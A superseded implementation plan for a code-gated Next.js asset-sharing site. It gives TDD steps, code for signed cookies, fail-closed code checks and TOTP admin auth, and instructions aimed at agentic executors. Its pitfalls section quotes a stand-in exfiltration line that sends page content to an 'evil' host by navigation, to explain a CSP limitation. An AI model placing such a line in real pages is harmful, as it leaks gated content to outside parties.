# Gated Asset Sharing Site — Implementation Plan

> ⚠️ **SUPERSEDED (2026-07-02).** This plan was written against the *original* design and rebuilds the
> pre-hardening model. **Do not execute it.** Use [`2026-07-02-gated-asset-sharing-site-plan.md`](2026-07-02-gated-asset-sharing-site-plan.md),
> which is derived from the authoritative [`…-design.REVISED.md`](../design/2026-07-01-gated-asset-sharing-site-design.REVISED.md).
> Rationale + the 53-gap diff: [`…-plan-vs-design-gap.md`](2026-07-01-gated-asset-sharing-site-plan-vs-design-gap.md). Retained for the gap report's citations.

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a single-admin Next.js site on Vercel that serves self-contained interactive HTML "assets" gated behind admin-generated access codes (per-recipient, expiring, revocable), published git-natively.

**Architecture:** One Next.js (App Router) app. A `/a/[slug]` route handler validates a `?code=`, sets a signed HttpOnly asset cookie, and 302-redirects to a clean URL; subsequent loads re-check the code in Postgres (fail-closed) to keep revocation instant. A password+TOTP-gated `/admin` panel mints/revokes codes. Assets live as `assets/<slug>/index.html` folders read from the serverless bundle; a build step produces a manifest. Codes live in Vercel Postgres (Neon) via Drizzle.

**Tech Stack:** Next.js 15 (App Router, TypeScript), Vercel, Vercel Postgres (Neon) + `@neondatabase/serverless`, Drizzle ORM + drizzle-kit, `jose` (cookie/token signing, HS256), `otpauth` (TOTP), Node `crypto` (scrypt password hash, CSPRNG codes), Vitest (tests).

---

## Living Document Contract

This plan is a living document. Every executing agent MUST update it as
execution progresses, not only at completion.

- **On phase claim:** the executor MUST flip the banner to 🚧 IN PROGRESS
  with a claim timestamp (ISO 8601 UTC) and the active branch name. The
  banner MUST NOT include an expected-completion estimate — agents cannot
  reliably estimate their own wall-clock, and a fabricated duration
  becomes a stale anchor that misleads future readers. Followers
  encountering a 🚧 banner determine liveness by observable signals (PR
  existence, recent branch commits), not by arithmetic on expected times.
  See Step 5's stale-claim reclaim protocol.
- **On phase ship:** the executor MUST update that phase's **Execution
  Status** banner with the shipped commit SHA(s) and date. If a PR is
  open, the PR number and URL MUST appear in the top-of-plan Execution
  Status table.
- **On phase defer:** the executor MUST update the banner with ⏸ status
  AND a prose description of the unblock condition + a link to the
  likely-unblocker artifact (plan page, task, or PR whose own Execution
  Status banner will signal completion). Prose + link is durable across
  paraphrases and scope edits; exact-string coordination between agents
  is not.
- **On PR merge:** the executor MUST record the merge SHA in the banner
  + the top-of-plan Execution Status table.
- **On deviation from the written plan** (scope edits, structural
  refactors, dropped tasks, reordered phases): the executor MUST
  inline-document the deviation in the affected task AND summarize it
  in the top-of-plan Execution Status as a "Deviations" subsection.
  Deviation state MUST NOT live only in PR notes or status reports.
- **On discovery** (pre-existing drift surfaced during execution, new
  bugs found, architectural issues noted): the executor MUST add a
  "Discoveries" subsection at the top of the plan with pointers to the
  files/lines affected. Follow-up dispatches read this subsection to
  avoid duplicate discovery work.

The plan SHOULD reflect reality at the end of every session that touches
it. Anything worth putting in a status report to the user is worth
putting in the plan.

Rationale: `/writing-plans-enhanced` Step 5. Writing at ship time is
cheap; reconstruction by downstream readers is expensive, compounds
across dispatches, and fails silently when state is split across PR
notes and commit messages.

---

## Execution Status

**Overall:** Not started.

| Phase | Status | Ship SHA(s) | Notes |
|---|---|---|---|
| 0 — Foundation & pitfalls docs | ⬜ Not started | — | — |
| 1 — Bundling spike (risk-first) | ⬜ Not started | — | gates all disk-read work |
| 2 — DB schema & core code logic | ⬜ Not started | — | — |
| 3 — Gate route, cookie, headers | ⬜ Not started | — | — |
| 4 — Admin auth (password + TOTP) | ⬜ Not started | — | — |
| 5 — Admin panel UI | ⬜ Not started | — | — |
| 6 — Asset pipeline (generator + manifest) | ⬜ Not started | — | — |
| 7 — Deploy pipeline & isolation | ⬜ Not started | — | — |

### Deviations
- _(none yet)_

### Discoveries
- _(none yet)_

---

## Conventions (read before any task)

- **Spec:** [`docs/superpowers/specs/2026-07-01-gated-asset-sharing-site-design.md`](../superpowers/specs/2026-07-01-gated-asset-sharing-site-design.md). Section refs below (e.g. "spec §6") point there.
- **Package manager:** `npm` (Node 24). **Test runner:** Vitest — `npm test` runs `vitest run`.
- **File layout:**
  - `src/lib/db/{schema.ts,client.ts}` — Drizzle schema + Neon client
  - `src/lib/{codes.ts,ratelimit.ts}` — code gen/validation, rate limiting
  - `src/lib/crypto/tokens.ts` — signed asset + session tokens (jose)
  - `src/lib/auth/{password.ts,totp.ts,session.ts}` — admin auth
  - `src/app/a/[slug]/route.ts` — gate route handler
  - `src/app/admin/**` — admin pages + server actions
  - `src/middleware.ts` — global security headers + admin guard
  - `scripts/{new-asset.mjs,build-manifest.mjs}` — CLI + build step
  - `assets/<slug>/index.html`, `assets/manifest.json`
- **Env vars** (spec §10): `ADMIN_PASSWORD_HASH`, `ADMIN_TOTP_SECRET`, `SESSION_SECRET`, `ASSET_COOKIE_SECRET`, `DATABASE_URL` (Neon). Tests use a `.env.test` with dummy values (see Task 0.3).
- **Every task is TDD.** The per-task blocks below are mandatory, not optional.
- **Phase-completion review (applies to every phase's "BEFORE marking … complete" gate):** review the phase's batch of changes from multiple perspectives across a **minimum of 3 review rounds**; if the 3rd round still finds substantive issues, keep going until a round is clean. At minimum cover: security invariants (negative paths, fail-closed), spec conformance, and cross-task type/name consistency.
- **Assertion rigor (all timing/DB/concurrency tests — esp. Phases 3–4):** if a test races or flakes, fix it with deterministic synchronization or a controlled clock/fake — **never** by removing or weakening the assertion. If it can't be made deterministic, STOP and raise. Commit subjects touching assertions MUST say add/strengthen/preserve (or explicitly "weaken" + why); "stabilization" is banned. See `docs/pitfalls/testing-pitfalls.md`.

---

## Phase 0 — Foundation & pitfalls docs

**Execution Status:** ⬜ NOT STARTED

> Why this phase first: establishes the toolchain, the test harness every later task depends on, and the project-specific pitfalls docs the TDD blocks reference. The pitfalls docs are seeded from the three adversarial review rounds recorded in the spec.

### Task 0.1: Seed the pitfalls docs

**Files:**
- Create: `docs/pitfalls/implementation-pitfalls.md`
- Create: `docs/pitfalls/testing-pitfalls.md`

- [ ] **Step 1: Create `docs/pitfalls/implementation-pitfalls.md`** with this content:

```markdown
# Implementation Pitfalls (project-specific)

Traps surfaced during design review. Re-read before implementing related code.

## Serverless file bundling (spec §7, Phase 1)
`fs.readFile('assets/<slug>/index.html')` in a route handler 404s in prod unless
`assets/**` is traced into the lambda. Configure `outputFileTracingIncludes` and resolve
paths from `process.cwd()`. NEVER assume "works in `next dev`" means "works on Vercel" —
Phase 1 exists to prove this on a real deploy before anything builds on it.

## Fail closed on DB error (spec §3, §6)
The per-load code re-check MUST deny access when the DB is unreachable — do NOT fall back to
serving from the cookie alone. Serving on DB error would let a revoked code work during an
outage. Use `@neondatabase/serverless` (HTTP) with a short timeout so blips fail fast.

## The access code is the entire secret (spec §3)
Never log the raw `?code=`. Never put the code (or anything JS-readable) in the asset cookie —
store the code-id only. Never place asset HTML under `/public`. Strip `?code=` via the 302.

## Cookie Path + opaque slugs (spec §6, §7)
Asset cookie is `Path=/a/<slug>`. Slugs MUST be fixed-length (22 base64url chars) so no slug is
a path-prefix of another. Enforce the length/charset in the build step.

## CSP cannot stop top-level-navigation exfiltration (spec §9)
The `'self'` CSP blocks background beaconing, NOT `window.location = 'https://evil/#'+body`.
This residual is accepted (trusted admin author). Do not claim the CSP makes exfil impossible.

## TOTP replay needs persisted state (spec §5, §8)
Reuse-rejection requires the `totp_used_steps` table. An env-var secret alone cannot track
consumed steps. Serverless has no shared memory — the store MUST be Postgres (or KV), not
in-process.

## Admin is production-only (spec §8, §11)
`/admin/*` MUST be inert unless `VERCEL_ENV === 'production'`, else an admin on a preview
deployment mints codes into the throwaway preview DB.
```

- [ ] **Step 2: Create `docs/pitfalls/testing-pitfalls.md`** with this content:

```markdown
# Testing Pitfalls (project-specific)

## Do not weaken assertions to fix flakes
If a timing/DB/concurrency test races or flakes, the fix is deterministic synchronization
(await a real signal, seed the DB deterministically, control the clock) — NOT deleting or
loosening the assertion. If you cannot make it deterministic, STOP and raise it. A commit that
touches assertions MUST say in its subject what happened to them (add/strengthen/preserve, or
explicitly "weaken" + why). "test stabilization" as a subject is banned.

## Test the security invariants, not just the happy path
For every gate/auth feature, the negative test is the important one: expired code denied,
revoked code denied on the NEXT load, wrong TOTP denied, DB-down denied, unknown-slug and
bad-code responses byte-identical. A feature without its negative tests is not done.

## Control time; never sleep
Expiry, TOTP steps, and rate-limit windows are time-dependent. Inject a clock / use fake timers
(`vi.useFakeTimers()` / pass `now` as a parameter). Never `setTimeout`-sleep in a test.

## Enumeration parity is about failure-vs-failure only
Assert unknown-slug and bad-code return identical body+status+headers. Do NOT assert
success-vs-failure indistinguishability — success is a 302 and is meant to differ (spec §3).

## Don't hit the network or a real Neon DB in unit tests
Unit-test pure logic (code gen, validation predicate, token sign/verify, TOTP) with no DB.
DB-integration tests use a local Postgres or a disposable Neon branch, seeded deterministically.
```

- [ ] **Step 3: Commit**

```bash
git add docs/pitfalls/
git commit -m "docs: seed project pitfalls docs from design review"
```

### Task 0.2: Scaffold the Next.js app

**Files:**
- Create: whole Next.js skeleton (via CLI), `next.config.ts`, `.gitignore` additions
- Create: `.nvmrc`

- [ ] **Step 1: Scaffold into a temp dir, then merge without clobbering existing files.** Flag names vary across `create-next-app` versions; if a flag is rejected, answer the interactive prompts to match: **TypeScript = yes, App Router = yes, `src/` dir = yes, Tailwind = no, ESLint = yes, import alias = `@/*`, Turbopack = no**. The repo already has `.git/`, `docs/`, and `README.md` — do NOT let the scaffold overwrite them.

```bash
npx create-next-app@latest /tmp/gated-app --ts --app --eslint --src-dir --no-tailwind --import-alias "@/*" --use-npm
# Merge everything EXCEPT files we already own (README.md, docs/, .git/):
rsync -a --exclude='.git' --exclude='README.md' --exclude='docs' /tmp/gated-app/ ./
rm -rf /tmp/gated-app
node -v | sed 's/^v//' > .nvmrc   # bare version, no leading "v"
```

If `create-next-app` created its own `.gitignore`, keep it (later tasks append to it).

- [ ] **Step 2: Verify dev server boots**

Run: `npm run dev` then in another shell `curl -sS -o /dev/null -w "%{http_code}\n" http://localhost:3000`
Expected: `200`. Stop the dev server (Ctrl-C).

- [ ] **Step 3: Set the root page to a neutral blank page** (spec §9 — no enumeration).

Replace `src/app/page.tsx` with:

```tsx
export default function Home() {
  return null;
}
```

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "chore: scaffold Next.js app (App Router, TS, src dir)"
```

### Task 0.3: Install deps + wire Vitest

**Files:**
- Modify: `package.json` (deps + scripts)
- Create: `vitest.config.ts`, `.env.test`, `src/test/setup.ts`

- [ ] **Step 1: Install runtime + dev deps**

```bash
npm i drizzle-orm @neondatabase/serverless jose otpauth
npm i -D drizzle-kit vitest @vitest/coverage-v8 dotenv
```

- [ ] **Step 2: Create `vitest.config.ts`**

```ts
import { defineConfig } from "vitest/config";
import { fileURLToPath } from "node:url";

export default defineConfig({
  test: {
    environment: "node",
    setupFiles: ["src/test/setup.ts"],
    include: ["src/**/*.test.ts", "scripts/**/*.test.ts"],
  },
  resolve: {
    alias: { "@": fileURLToPath(new URL("./src", import.meta.url)) },
  },
});
```

- [ ] **Step 3: Create `.env.test`** (dummy secrets — safe to commit; never used in prod):

```
DATABASE_URL=postgres://test:test@localhost:5432/test
SESSION_SECRET=test-session-secret-do-not-use-in-prod-0000000000
ASSET_COOKIE_SECRET=test-asset-secret-do-not-use-in-prod-00000000000
ADMIN_PASSWORD_HASH=placeholder-set-in-task-4
ADMIN_TOTP_SECRET=JBSWY3DPEHPK3PXP
```

`.env.test` MUST be committed (a fresh worktree needs it or `npm test` fails). create-next-app's `.gitignore` ignores env files, so add a negation so this one file is tracked — append to `.gitignore`:

```
!.env.test
```

Verify with `git check-ignore .env.test` → should print **nothing** (not ignored). If it's still ignored, `git add -f .env.test`.

- [ ] **Step 4: Create `src/test/setup.ts`**

```ts
import { config } from "dotenv";
config({ path: ".env.test" });
```

- [ ] **Step 5: Add scripts to `package.json`** (`scripts` block):

```json
"test": "vitest run",
"test:watch": "vitest",
"db:generate": "drizzle-kit generate",
"db:migrate": "drizzle-kit migrate",
"new-asset": "node scripts/new-asset.mjs",
"build-manifest": "node scripts/build-manifest.mjs"
```

- [ ] **Step 5b: Keep tests + scripts out of the Next build type-check.** create-next-app's `tsconfig.json` includes `**/*.ts`, so `next build` would type-check Vitest files (and the `.mjs` import in Task 6.2), likely failing the build. Add `exclude` entries to `tsconfig.json` (merge with any existing `exclude` — keep `node_modules`):

```json
"exclude": ["node_modules", "**/*.test.ts", "scripts/**"]
```

(Vitest runs tests via its own config and is unaffected by this exclude.)

- [ ] **Step 6: Add a smoke test** `src/test/smoke.test.ts`:

```ts
import { expect, test } from "vitest";
test("env loads", () => { expect(process.env.SESSION_SECRET).toBeTruthy(); });
```

- [ ] **Step 7: Run tests**

Run: `npm test`
Expected: PASS (1 test).

- [ ] **Step 8: Commit**

```bash
git add -A
git commit -m "chore: add drizzle, jose, otpauth, vitest test harness"
```

**BEFORE marking Phase 0 complete:** update this phase's banner to ✅ SHIPPED with SHA/date; flip the Execution Status table row.

---

## Phase 1 — Bundling spike (RISK-FIRST)

**Execution Status:** ⬜ NOT STARTED

> Why now: spec §12 mandates proving `assets/**` is readable from the **deployed** lambda before any real gate logic is built on disk reads. This is the single highest-risk assumption. **Do NOT proceed to Phase 3 until this phase is ✅ and verified on a real Vercel URL.** Read `docs/pitfalls/implementation-pitfalls.md` → "Serverless file bundling" first.

### Task 1.1: Prove disk reads work in a deployed lambda

**Files:**
- Create: `assets/spike00000000000000000000/index.html` (throwaway; 22-char slug)
- Create: `src/app/a/[slug]/route.ts` (spike version)
- Modify: `next.config.ts`

- [ ] **Step 1: Create the throwaway asset** `assets/spike00000000000000000000/index.html`:

```html
<!doctype html><title>Spike</title><h1>bundling spike ok</h1>
```

- [ ] **Step 2: Configure file tracing** in `next.config.ts`:

```ts
import type { NextConfig } from "next";
import path from "node:path";

const nextConfig: NextConfig = {
  outputFileTracingIncludes: {
    "/a/[slug]": ["./assets/**/*.html"],
  },
  outputFileTracingRoot: path.join(process.cwd()),
};
export default nextConfig;
```

- [ ] **Step 3: Create the spike route** `src/app/a/[slug]/route.ts`:

```ts
import { readFile } from "node:fs/promises";
import path from "node:path";

export const dynamic = "force-dynamic";

export async function GET(
  _req: Request,
  { params }: { params: Promise<{ slug: string }> },
) {
  const { slug } = await params;
  if (!/^[A-Za-z0-9_-]{22}$/.test(slug)) return new Response("nope", { status: 404 });
  const file = path.join(process.cwd(), "assets", slug, "index.html");
  try {
    const html = await readFile(file, "utf8");
    return new Response(html, { headers: { "content-type": "text/html; charset=utf-8" } });
  } catch {
    return new Response("nope", { status: 404 });
  }
}
```

- [ ] **Step 4: Verify locally**

Run: `npm run dev` then `curl -sS http://localhost:3000/a/spike00000000000000000000`
Expected: HTML containing `bundling spike ok`. Stop dev server.

- [ ] **Step 5: Deploy a preview and verify in prod runtime.** (Requires Vercel CLI + linked project — if not yet linked, run `npx vercel link` first; a Vercel account exists per project brief.)

```bash
npx vercel pull --yes            # pull project settings
npx vercel deploy                # preview deploy; prints a URL
# Then:
curl -sS "<preview-url>/a/spike00000000000000000000"
```

Expected: HTML containing `bundling spike ok` **served from the deployed lambda**.
**If this 404s:** the include glob is wrong. Try the route-file key form `outputFileTracingIncludes: { "src/app/a/[slug]/route": ["./assets/**"] }`, redeploy, re-curl. Record whichever form works in the plan's Discoveries subsection.

- [ ] **Step 6: Record the outcome** in the top-of-plan **Discoveries** subsection: which `outputFileTracingIncludes` key form was verified working on Vercel, and the preview URL used.

- [ ] **Step 7: Commit**

```bash
git add assets/ src/app/a/ next.config.ts
git commit -m "spike: verify assets/** bundles into deployed lambda"
```

**BEFORE marking Phase 1 complete:** the Vercel-URL curl in Step 5 MUST have returned the HTML. If it did not and no include form works, STOP and raise — the disk-read architecture (spec §7) needs revisiting (fallback: build-generated module map importing HTML as strings). Update banner + table.

---

## Phase 2 — DB schema & core code logic

**Execution Status:** ⬜ NOT STARTED

> Pure, DB-light logic with heavy unit tests. Read `docs/pitfalls/testing-pitfalls.md` → "Control time" and "Don't hit the network in unit tests".

### Task 2.1: Drizzle schema + Neon client

**Files:**
- Create: `src/lib/db/schema.ts`, `src/lib/db/client.ts`, `drizzle.config.ts`

- [ ] **Step 1: Write the schema** `src/lib/db/schema.ts` (spec §5):

```ts
import { bigint, integer, pgTable, text, timestamp, uuid } from "drizzle-orm/pg-core";

export const codes = pgTable("codes", {
  id: uuid("id").defaultRandom().primaryKey(),
  code: text("code").notNull().unique(),
  assetSlug: text("asset_slug").notNull(),
  label: text("label").notNull().default(""),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
  expiresAt: timestamp("expires_at", { withTimezone: true }).notNull(),
  revokedAt: timestamp("revoked_at", { withTimezone: true }),
  lastUsedAt: timestamp("last_used_at", { withTimezone: true }),
  useCount: integer("use_count").notNull().default(0),
});

export const totpUsedSteps = pgTable("totp_used_steps", {
  step: bigint("step", { mode: "number" }).primaryKey(),
  usedAt: timestamp("used_at", { withTimezone: true }).notNull().defaultNow(),
});

export const rateLimits = pgTable("rate_limits", {
  key: text("key").primaryKey(),
  count: integer("count").notNull().default(0),
  windowStart: timestamp("window_start", { withTimezone: true }).notNull().defaultNow(),
});
```

- [ ] **Step 2: Write the client** `src/lib/db/client.ts` (Neon HTTP driver, fail-fast — see pitfalls "Fail closed"):

```ts
import { neon } from "@neondatabase/serverless";
import { drizzle, type NeonHttpDatabase } from "drizzle-orm/neon-http";
import * as schema from "./schema";

// Lazy init: neon() throws on an empty connection string, and `next build` imports
// this module (without querying) when DATABASE_URL may be unset. A Proxy defers
// construction to the first actual query, so importing is always safe.
let real: NeonHttpDatabase<typeof schema> | null = null;
function init(): NeonHttpDatabase<typeof schema> {
  if (!real) {
    const url = process.env.DATABASE_URL;
    if (!url) throw new Error("DATABASE_URL is not set");
    real = drizzle(neon(url), { schema });
  }
  return real;
}

export const db = new Proxy({} as NeonHttpDatabase<typeof schema>, {
  get(_t, prop) {
    const d = init() as Record<string | symbol, unknown>;
    const v = d[prop];
    return typeof v === "function" ? (v as (...a: unknown[]) => unknown).bind(d) : v;
  },
});
```

- [ ] **Step 3: Write `drizzle.config.ts`**

```ts
import { defineConfig } from "drizzle-kit";

export default defineConfig({
  schema: "./src/lib/db/schema.ts",
  out: "./drizzle",
  dialect: "postgresql",
  dbCredentials: { url: process.env.DATABASE_URL! },
});
```

- [ ] **Step 4: Generate the initial migration**

Run: `DATABASE_URL=postgres://x npm run db:generate`
Expected: a SQL file appears under `drizzle/`.

- [ ] **Step 5: Commit**

```bash
git add src/lib/db drizzle.config.ts drizzle/
git commit -m "feat: drizzle schema (codes, totp_used_steps, rate_limits) + neon client"
```

### Task 2.2: Code generation

**Files:**
- Create: `src/lib/codes.ts`, `src/lib/codes.test.ts`

- [ ] **Step 1: Write the failing test** `src/lib/codes.test.ts`:

```ts
import { expect, test } from "vitest";
import { generateCode, generateSlug } from "./codes";

test("generateCode is 22 base64url chars (128-bit)", () => {
  const c = generateCode();
  expect(c).toMatch(/^[A-Za-z0-9_-]{22}$/);
});

test("generateCode is unique across calls", () => {
  const set = new Set(Array.from({ length: 1000 }, () => generateCode()));
  expect(set.size).toBe(1000);
});

test("generateSlug is 22 base64url chars", () => {
  expect(generateSlug()).toMatch(/^[A-Za-z0-9_-]{22}$/);
});
```

- [ ] **Step 2: Run to verify it fails**

Run: `npm test -- codes`
Expected: FAIL (module not found).

- [ ] **Step 3: Implement** `src/lib/codes.ts`:

```ts
import { randomBytes } from "node:crypto";

/** 16 random bytes → base64url → 22 chars, 128-bit. */
function token128(): string {
  return randomBytes(16).toString("base64url");
}

export const generateCode = token128;
export const generateSlug = token128;
```

- [ ] **Step 4: Run to verify pass**

Run: `npm test -- codes`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/lib/codes.ts src/lib/codes.test.ts
git commit -m "feat: 128-bit CSPRNG code/slug generation"
```

### Task 2.3: Code validation predicate

**Files:**
- Modify: `src/lib/codes.ts`, `src/lib/codes.test.ts`

- [ ] **Step 1: Add failing tests** to `src/lib/codes.test.ts` (control time — pass `now`):

```ts
import { isCodeValid } from "./codes";

const base = {
  id: "x", code: "c", assetSlug: "s", label: "",
  createdAt: new Date("2026-01-01T00:00:00Z"),
  expiresAt: new Date("2026-04-01T00:00:00Z"),
  revokedAt: null as Date | null, lastUsedAt: null as Date | null, useCount: 0,
};
const now = new Date("2026-02-01T00:00:00Z");

test("valid when not revoked, not expired, slug matches", () => {
  expect(isCodeValid(base, "s", now)).toBe(true);
});
test("invalid when slug mismatches", () => {
  expect(isCodeValid(base, "other", now)).toBe(false);
});
test("invalid when revoked", () => {
  expect(isCodeValid({ ...base, revokedAt: new Date("2026-01-15T00:00:00Z") }, "s", now)).toBe(false);
});
test("invalid when expired", () => {
  expect(isCodeValid(base, "s", new Date("2026-05-01T00:00:00Z"))).toBe(false);
});
```

- [ ] **Step 2: Run to verify fail**

Run: `npm test -- codes`
Expected: FAIL (`isCodeValid` not defined).

- [ ] **Step 3: Implement** — append to `src/lib/codes.ts`:

```ts
export type CodeRow = {
  id: string; code: string; assetSlug: string; label: string;
  createdAt: Date; expiresAt: Date; revokedAt: Date | null;
  lastUsedAt: Date | null; useCount: number;
};

/** Validity predicate (spec §5). Slug must match; not revoked; not expired at `now`. */
export function isCodeValid(row: CodeRow, slug: string, now: Date): boolean {
  if (row.assetSlug !== slug) return false;
  if (row.revokedAt !== null) return false;
  if (row.expiresAt.getTime() <= now.getTime()) return false;
  return true;
}

/** Default expiry: now + 90 days (spec §5). */
export function defaultExpiry(now: Date): Date {
  return new Date(now.getTime() + 90 * 24 * 60 * 60 * 1000);
}
```

- [ ] **Step 4: Add a default-expiry test** to `src/lib/codes.test.ts`:

```ts
import { defaultExpiry } from "./codes";
test("defaultExpiry is now + 90 days", () => {
  const d = defaultExpiry(new Date("2026-01-01T00:00:00Z"));
  expect(d.toISOString()).toBe("2026-04-01T00:00:00.000Z");
});
```

- [ ] **Step 5: Run to verify pass**

Run: `npm test -- codes`
Expected: PASS (all).

- [ ] **Step 6: Commit**

```bash
git add src/lib/codes.ts src/lib/codes.test.ts
git commit -m "feat: code validity predicate + 90-day default expiry"
```

### Task 2.4: Signed tokens (asset cookie + session)

**Files:**
- Create: `src/lib/crypto/tokens.ts`, `src/lib/crypto/tokens.test.ts`

- [ ] **Step 1: Write failing tests** `src/lib/crypto/tokens.test.ts` (payload binding + cross-asset replay + rotation — spec §6):

```ts
import { expect, test } from "vitest";
import { signAssetToken, verifyAssetToken } from "./tokens";

const secret = "test-asset-secret-do-not-use-in-prod-00000000000";

test("round-trips a valid asset token", async () => {
  const tok = await signAssetToken({ slug: "s", cid: "id1" }, secret, 3600);
  const p = await verifyAssetToken(tok, "s", secret);
  expect(p?.cid).toBe("id1");
});

test("rejects a token for a different slug (no cross-asset replay)", async () => {
  const tok = await signAssetToken({ slug: "s", cid: "id1" }, secret, 3600);
  expect(await verifyAssetToken(tok, "other", secret)).toBeNull();
});

test("rejects a token signed with a rotated secret", async () => {
  const tok = await signAssetToken({ slug: "s", cid: "id1" }, secret, 3600);
  expect(await verifyAssetToken(tok, "s", "a-different-secret-000000000000000000000000")).toBeNull();
});

test("rejects an expired token", async () => {
  const tok = await signAssetToken({ slug: "s", cid: "id1" }, secret, -1);
  expect(await verifyAssetToken(tok, "s", secret)).toBeNull();
});
```

- [ ] **Step 2: Run to verify fail**

Run: `npm test -- tokens`
Expected: FAIL (module not found).

- [ ] **Step 3: Implement** `src/lib/crypto/tokens.ts`:

```ts
import { SignJWT, jwtVerify } from "jose";

const enc = (s: string) => new TextEncoder().encode(s);

export type AssetClaims = { slug: string; cid: string };

/** Sign an asset-access token bound to {slug, cid}. ttlSeconds may be <=0 for tests. */
export async function signAssetToken(claims: AssetClaims, secret: string, ttlSeconds: number): Promise<string> {
  const iat = Math.floor(Date.now() / 1000);
  return await new SignJWT({ slug: claims.slug, cid: claims.cid })
    .setProtectedHeader({ alg: "HS256" })
    .setIssuedAt(iat)
    .setExpirationTime(iat + ttlSeconds)
    .sign(enc(secret));
}

/** Verify signature + expiry + that the token's slug matches `expectedSlug`. */
export async function verifyAssetToken(token: string, expectedSlug: string, secret: string): Promise<AssetClaims | null> {
  try {
    const { payload } = await jwtVerify(token, enc(secret));
    if (payload.slug !== expectedSlug || typeof payload.cid !== "string") return null;
    return { slug: payload.slug as string, cid: payload.cid };
  } catch {
    return null;
  }
}

export async function signSession(secret: string, ttlSeconds: number): Promise<string> {
  const iat = Math.floor(Date.now() / 1000);
  return await new SignJWT({ sub: "admin" })
    .setProtectedHeader({ alg: "HS256" })
    .setIssuedAt(iat)
    .setExpirationTime(iat + ttlSeconds)
    .sign(enc(secret));
}

export async function verifySession(token: string, secret: string): Promise<boolean> {
  try {
    const { payload } = await jwtVerify(token, enc(secret));
    return payload.sub === "admin";
  } catch {
    return false;
  }
}
```

- [ ] **Step 4: Add session round-trip tests** to `src/lib/crypto/tokens.test.ts`:

```ts
import { signSession, verifySession } from "./tokens";
test("session round-trips", async () => {
  expect(await verifySession(await signSession(secret, 3600), secret)).toBe(true);
});
test("session rejects wrong secret", async () => {
  expect(await verifySession(await signSession(secret, 3600), "nope-000000000000000000000000000000000")).toBe(false);
});
```

- [ ] **Step 5: Run to verify pass**

Run: `npm test -- tokens`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add src/lib/crypto
git commit -m "feat: signed asset + session tokens with slug binding (jose HS256)"
```

**BEFORE marking Phase 2 complete:** Review tests vs `docs/pitfalls/testing-pitfalls.md` (negative paths present? time controlled?). Run `npm test` (all green). Update banner + table.

---

## Phase 3 — Gate route, cookie, headers

**Execution Status:** ⬜ NOT STARTED

> Depends on Phase 1 (✅ bundling verified) and Phase 2 (tokens, validation). Read `docs/pitfalls/implementation-pitfalls.md` → "Fail closed", "Cookie Path", "The access code is the entire secret".
>
> **Assertion-rigor rule (mandatory for this phase's timing/DB tests):** If any test racing on DB state or fail-closed timing flakes, the fix is deterministic synchronization or a controlled fake DB — NOT assertion removal. If it can't be made deterministic, STOP and raise. Prefer mechanism assertions (e.g. "revoked → next load denied") over symptom assertions. Commit subjects touching assertions MUST say add/strengthen/preserve, never "stabilization".

### Task 3.1: DB access helpers for the gate

**Files:**
- Create: `src/lib/gate.ts`, `src/lib/gate.test.ts`

> These functions take a `db`-like dependency so they're unit-testable with a fake. The real `db` is injected in the route handler (Task 3.2).

- [ ] **Step 1: Write failing tests** `src/lib/gate.test.ts` (fake repo; fail-closed is the key negative test):

```ts
import { expect, test, vi } from "vitest";
import { redeemCode, recheckCode } from "./gate";
import type { CodeRow } from "./codes";

const now = new Date("2026-02-01T00:00:00Z");
const row: CodeRow = {
  id: "id1", code: "abc", assetSlug: "s", label: "",
  createdAt: now, expiresAt: new Date("2026-05-01T00:00:00Z"),
  revokedAt: null, lastUsedAt: null, useCount: 0,
};

test("redeemCode returns cid + records usage for a valid code", async () => {
  const repo = { findByCode: vi.fn().mockResolvedValue(row), recordUsage: vi.fn().mockResolvedValue(undefined), findById: vi.fn() };
  const res = await redeemCode(repo, "abc", "s", now);
  expect(res).toEqual({ cid: "id1" });
  expect(repo.recordUsage).toHaveBeenCalledWith("id1", now);
});

test("redeemCode returns null for wrong slug", async () => {
  const repo = { findByCode: vi.fn().mockResolvedValue(row), recordUsage: vi.fn(), findById: vi.fn() };
  expect(await redeemCode(repo, "abc", "other", now)).toBeNull();
  expect(repo.recordUsage).not.toHaveBeenCalled();
});

test("recheckCode true for valid, false for revoked", async () => {
  const ok = { findByCode: vi.fn(), recordUsage: vi.fn(), findById: vi.fn().mockResolvedValue(row) };
  expect(await recheckCode(ok, "id1", "s", now)).toBe(true);
  const revoked = { ...ok, findById: vi.fn().mockResolvedValue({ ...row, revokedAt: now }) };
  expect(await recheckCode(revoked, "id1", "s", now)).toBe(false);
});

test("recheckCode FAILS CLOSED when the DB throws", async () => {
  const broken = { findByCode: vi.fn(), recordUsage: vi.fn(), findById: vi.fn().mockRejectedValue(new Error("db down")) };
  expect(await recheckCode(broken, "id1", "s", now)).toBe(false);
});
```

- [ ] **Step 2: Run to verify fail**

Run: `npm test -- gate`
Expected: FAIL (module not found).

- [ ] **Step 3: Implement** `src/lib/gate.ts`:

```ts
import { isCodeValid, type CodeRow } from "./codes";

export interface CodeRepo {
  findByCode(code: string): Promise<CodeRow | null>;
  findById(id: string): Promise<CodeRow | null>;
  recordUsage(id: string, now: Date): Promise<void>;
}

/** Redemption path (spec §6 step 4). Returns {cid} + records usage, or null. */
export async function redeemCode(repo: CodeRepo, code: string, slug: string, now: Date): Promise<{ cid: string } | null> {
  const row = await repo.findByCode(code);
  if (!row || !isCodeValid(row, slug, now)) return null;
  await repo.recordUsage(row.id, now);
  return { cid: row.id };
}

/** Per-load recheck (spec §6 step 5). FAILS CLOSED on any DB error. */
export async function recheckCode(repo: CodeRepo, cid: string, slug: string, now: Date): Promise<boolean> {
  try {
    const row = await repo.findById(cid);
    return !!row && isCodeValid(row, slug, now);
  } catch {
    return false; // fail closed — see docs/pitfalls/implementation-pitfalls.md
  }
}
```

- [ ] **Step 4: Run to verify pass**

Run: `npm test -- gate`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/lib/gate.ts src/lib/gate.test.ts
git commit -m "feat: gate redeem/recheck logic with fail-closed DB recheck"
```

### Task 3.2: The `/a/[slug]` route handler

**Files:**
- Create: `src/lib/db/codeRepo.ts` (real repo over Drizzle)
- Create: `src/lib/assets.ts` (read HTML from disk)
